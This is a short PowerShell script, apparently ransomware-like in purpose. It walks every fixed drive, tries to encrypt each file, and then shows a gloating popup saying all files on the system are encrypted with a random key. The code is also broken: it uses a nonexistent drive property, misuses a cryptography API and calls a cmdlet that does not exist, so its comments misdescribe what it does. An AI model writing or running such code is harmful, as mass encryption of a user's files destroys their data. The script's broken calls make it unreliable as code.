# Get a list of all drives on the system
$Drives = Get-PSDrive | Where-Object { $_.DriveType -eq 'Fixed' }

foreach ($Drive in $Drives) {
    # Check if EFS is available on the drive
    if (!([System.Security.Cryptography.CngKey]::Open("$($Drive.Name)\\")).IsEphemeral) {
        # Encrypt all the files in the drive
        Get-ChildItem "$($Drive.Name)\\" -Recurse | ForEach-Object {
            if (!$_.PsIsContainer) {
                try {
                    # Encrypt the file with a random key
                    EFSEncrypt $_.FullName /UseCurrentUserCertificate /AddCurrentUserCertificate
                    Write-Host "Encrypted: " $_.FullName
                }
                catch {
                    Write-Host "Encryption failed for: " $_.FullName
                }
            }
        }
    } else {
        Write-Host "EFS is not supported on drive $($Drive.Name)"
    }
}

# Display the success message
$wshell = New-Object -ComObject Wscript.Shell
$wshell.Popup("All files on this system have been encrypted with a random key :)", 0, "Encryption Complete", 0x1)
